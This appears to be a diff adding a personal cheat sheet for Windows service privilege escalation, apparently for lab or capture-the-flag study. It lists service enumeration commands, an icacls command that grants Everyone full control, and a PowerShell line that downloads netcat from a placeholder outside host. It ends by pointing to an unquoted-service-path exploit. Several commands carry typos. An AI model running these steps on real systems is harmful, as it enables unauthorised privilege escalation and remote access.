@@ -1,0 +1,37 @@
+Find all services:
+-Tasklist \svc
+
+Find All services + Path:
+-wmic service get name,displayname,pathname,startmode
+
+Find All services + Specifi Service:
+-wmic service get name,displayname,pathname,startmode | findstr [service-name]
+
+To retrieve detailed information about any of the service
+-schtasks /query /tn vulntask /fo list /v
+
+View Details about SPECIFIC Service:
+-sc qc [service-name]
+
+Check the Priviledges:
+-icacls c:\BynaryPath Name
+
+Give Permissions - Priviledges:
+-icacls c:\PathName /grant Everyone:F
+
+Star / Stop Services:
+-sc start "Service Name"
+-sc stop "Service Name"
+
+Downloading File via Powershell activate Netcat:
+-powershell.exe "(New-Object System.net.WebClient).DownloadFile('http://IP/nc.exe', 'nc,exe')"
+
+
+######To Exploit Services#######:
+We Need to check the:
+
+    -BINARY_PATH_NAME
+    &&
+    -SERVICE_START_NAME
+
+We can try the "Unquoted Service Paths" Exploit - For more Details -> (Unquoted Service Paths.txt)
